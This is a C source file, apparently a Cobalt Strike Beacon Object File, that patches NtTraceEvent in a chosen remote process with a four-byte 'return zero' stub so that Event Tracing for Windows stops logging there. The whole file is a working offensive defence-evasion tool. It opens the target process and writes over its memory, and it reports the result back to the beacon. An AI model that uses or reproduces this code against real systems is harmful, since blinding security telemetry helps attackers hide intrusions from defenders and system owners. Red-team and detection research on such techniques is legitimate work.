#include <windows.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI HANDLE WINAPI KERNEL32$OpenProcess(
    DWORD dwDesiredAccess, 
    WINBOOL bInheritHandle, 
    DWORD dwProcessId);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$WriteProcessMemory (  
    HANDLE  hProcess,
    LPVOID  lpBaseAddress,
    LPCVOID lpBuffer,
    SIZE_T  nSize,
    SIZE_T  *lpNumberOfBytesWritten);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$VirtualProtect(
    LPVOID lpAddress,
    SIZE_T dwSize,
    DWORD  flNewProtect,
    PDWORD lpflOldProtect);

DECLSPEC_IMPORT WINBASEAPI WINBOOL WINAPI KERNEL32$CloseHandle(HANDLE hObject);

void patchETW(DWORD pid) {
    HANDLE hProc = NULL;
    SIZE_T bytesWritten;
    HANDLE nDLL = LoadLibrary("ntdll.dll");
    PVOID mAddress = GetProcAddress(nDLL, "NtTraceEvent");
    if (mAddress != NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "NtTraceEvent is at 0x%p", mAddress);
    }
    unsigned char etwbypass[] = { 0x48, 0x33, 0xc0, 0xc3 };

    hProc = KERNEL32$OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)pid);
    if (hProc == NULL) {
        BeaconPrintf(CALLBACK_OUTPUT, "Cannot open the process with this PID: %d", pid);
        return 1;
    }
    BeaconPrintf(CALLBACK_OUTPUT, "Process opened with this PID: %d", pid);

    BOOL success = KERNEL32$WriteProcessMemory(hProc, mAddress, (PVOID)etwbypass, sizeof(etwbypass), &bytesWritten);
    if (success) {
        BeaconPrintf(CALLBACK_OUTPUT, "Patched NtTraceEvent in remote process: PID:%d",pid);
        return 0;
    }
    else {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to patch NtTraceEvent in remote process: PID:%d", pid);
        return 1;
    }
    KERNEL32$CloseHandle(hProc);
}

void go(char * args, int len) {
    datap parser;
    DWORD pid;

    BeaconDataParse(&parser, args, len);
    pid = BeaconDataInt(&parser);
    BeaconPrintf(CALLBACK_OUTPUT, "Given Process ID: %d", pid);
    patchETW(pid);
}